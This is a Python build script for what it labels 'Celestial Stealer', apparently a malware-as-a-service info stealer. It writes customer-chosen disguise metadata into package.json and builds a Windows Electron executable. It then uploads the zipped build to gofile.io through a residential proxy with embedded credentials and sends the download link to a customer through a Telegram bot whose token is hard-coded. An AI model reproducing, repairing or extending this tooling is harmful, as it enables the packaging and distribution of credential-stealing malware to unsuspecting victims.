import sys
import os
import shutil
import requests
import time
import json
import traceback
import zipfile

def safe_rmtree(path):
    try:
        shutil.rmtree(path)
    except OSError as e:
        if e.errno == 145:
            print(f"Directory not empty: {path}. Retrying after delay...")
            time.sleep(1)
            try:
                shutil.rmtree(path)
            except OSError as e:
                print(f"Failed to remove directory {path}: {e}")
                raise
        else:
            raise

def safe_remove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
        else:
            print(f"File not found: {path}")
    except Exception as e:
        print(f"Error removing file {path}: {e}")
        raise

def zip_exe_file(exe_file_path, output_zip):
    try:
        with zipfile.ZipFile(output_zip, 'w', compression=zipfile.ZIP_LZMA) as zipf:
            zipf.write(exe_file_path, os.path.basename(exe_file_path))
        return output_zip
    except Exception as e:
        print(f"Failed to zip file {exe_file_path}: {e}")
        return None

def send_telegram(chat_id, message):
    payload = {
        'chat_id': chat_id,
        'text': message,
        'disable_notification': True,
        'parse_mode': 'html'
    }
    try:
        response = requests.post('https://api.telegram.org/bot7765494908:AAG9cYJILJsIeNcsivQubAaaIICZKW0pri0/sendMessage', json=payload)
        if response.status_code != 200:
            print('Failed to send message:', response.reason)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

def upload_file(file_path: str) -> str:
    try:
        response = requests.get('https://api.gofile.io/servers', proxies={ 'all': 'http://42711433:59980235@residental.beyondproxy.io:12321' })
        if response.status_code != 200:
            return False

        servers = response.json()["data"]["servers"] + response.json()["data"]["serversAllZone"]
        for server in servers:
            try:
                url = f"https://{server['name']}.gofile.io/uploadFile"
                with open(file_path, 'rb') as file:
                    files = {'file': file}
                    upload_response = requests.post(url, files=files, proxies={ 'all': 'http://42711433:59980235@residental.beyondproxy.io:12321' })
                    if upload_response.status_code == 200:
                        data = upload_response.json()
                        if data.get("status") == "ok":
                            return data["data"]["downloadPage"]
            except Exception as e:
                print(f"Error uploading file to {server['name']}: {e}")
                continue
        return False
    except Exception as e:
        print(f"Error during upload: {e}")
        traceback.print_exc()
        return False

def replace_in_files(replacements):
    for item in replacements:
        try:
            with open(item['path'], 'r') as file:
                content = file.read()
            modified_content = content
            for old_content, new_content in item['replacements']:
                modified_content = modified_content.replace(old_content, new_content)
            with open(item['path'], 'w') as file:
                file.write(modified_content)
        except Exception as e:
            print(f'Failed to update {item["path"]}: {str(e)}')

def build(customer_id, build_name, build_description, build_copyright, build_version, build_author, build_license):
    try:

        keys = [
            {
                'path': os.path.join(os.getcwd(), "package.json"),
                'replacements': [
                    ("build_name", build_name),
                    ("build_description", build_description),
                    ("build_copyright", build_copyright),
                    ("build_version", build_version),
                    ("build_author", build_author),
                    ("build_license", build_license)
                ]
            }
        ]
        print(keys)

        replace_in_files(keys)

        base_dir = os.path.join(os.getcwd(), "..", "base")
        build_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)))

        time.sleep(3)

        os.system(f'cd {build_dir} && npx electron-builder@25.0.5 --win')

        exe_file_path = os.path.join(build_dir, 'dist', f'{build_name}.exe')
        output_rar_file = os.path.join(build_dir, 'Build.rar')

        if not os.path.exists(exe_file_path):
            raise FileNotFoundError("Build not found")

        result_rar = zip_exe_file(exe_file_path, output_rar_file)

        if not os.path.exists(output_rar_file):
            raise FileNotFoundError("Zipped file not found")

        download_link = upload_file(output_rar_file)
        if download_link:
            send_telegram(customer_id, f'⚒️ <b>Celestial Stealer ・ Build</b> ⚒️\n\n🔗 <a href="{download_link}">Download</a>')
        else:
            send_telegram(customer_id, f'⚒️ <b>Celestial Stealer ・ Build</b> ⚒️\n\n⚠️ Build failed, try again or contact admin.')
        try:
            safe_rmtree(os.getcwd())
        except Exception as e:
            print(e)
    except Exception as e:
        traceback.print_exc()
        send_telegram(customer_id, f'⚒️ <b>Celestial Stealer ・ Build</b> ⚒️\n\n⚠️ Build failed, try again or contact admin.')

def load_settings():
    try:
        with open('settings.json', 'r', encoding='utf8') as file:
            settings = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        settings = {}
    return settings

def main():
    settings = load_settings()

    customer_id = str(settings.get("customer_id", "6464119537"))
    build_name = settings.get("build_name", "Host")
    build_description = settings.get("build_description", "Application by Host")
    build_copyright = settings.get("build_copyright", "Host Enterprise")
    build_version = settings.get("build_version", "1.0.0")
    build_author = settings.get("build_author", "Host Enterprise")
    build_license = settings.get("build_license", "MIT")

    build(customer_id, build_name, build_description, build_copyright, build_version, build_author, build_license)

if __name__ == "__main__":
    main()
